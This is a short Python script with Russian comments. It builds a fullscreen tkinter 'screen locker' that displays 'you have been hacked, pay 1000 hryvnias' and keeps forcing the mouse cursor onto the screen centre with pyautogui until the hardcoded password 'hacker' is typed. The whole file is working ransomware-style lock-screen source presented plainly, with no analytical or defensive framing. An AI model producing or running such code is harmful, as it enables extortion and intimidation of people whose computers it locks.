import pyautogui
import tkinter
import time

# команда отвечает за закрытие на пароль
def close_locker(event):
    global input_text, shutdown
    if input_text.get() == 'hacker':
        shutdown = False

# создаем окно
root = tkinter.Tk()

# добавляет текст
text = tkinter.Label(root, text='вас взломали плати 1000 гривень', font=1)
# размещает в сетке текст
text.grid(row=0, column=0)

# достаем ширину и высоту экрана пользвателя
x_screen = root.winfo_screenwidth()
y_screen = root.winfo_screenheight()

# добававляет поле для ввода
input_text = tkinter.Entry(root, font=1)
# width, height - длина  и высота, x y - куда поместить 
input_text.place(width=500, height=50, x=x_screen/2-250, y=y_screen/2)

# текст-подсказка
text2 = tkinter.Label(root, text='Введите пароль и нажмите Enter', font=1)
text2.place(x=x_screen/2-100, y=y_screen/2-50)

# найстройка на полный экран
root.attributes('-fullscreen', True)

shutdown = True
while shutdown == True:
    # обновляем окно
    root.update()
    
    # перемещает
    pyautogui.moveTo(x_screen/2+25, y_screen/2+25)

    # кликает
    pyautogui.click()

    # реагирует на клавишу Enter
    root.bind('<Return>', close_locker)
